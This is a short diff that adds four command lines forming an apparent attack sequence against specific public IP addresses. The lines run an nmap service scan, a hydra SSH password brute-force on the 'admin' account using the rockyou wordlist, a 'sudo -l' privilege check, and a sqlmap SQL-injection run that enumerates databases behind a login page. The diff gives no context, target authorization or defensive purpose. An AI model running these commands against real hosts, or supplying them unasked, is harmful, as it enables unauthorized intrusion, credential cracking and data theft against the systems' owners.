@@ -1,0 +1,4 @@
+nmap -sV -p 1-1024 47.239.245.22
+hydra -l admin -P rockyou.txt 200.251.237.99 ssh
+sudo -l
+sqlmap -u http://223.199.53.8/login.php --data='username=admin&password=123' --dbs
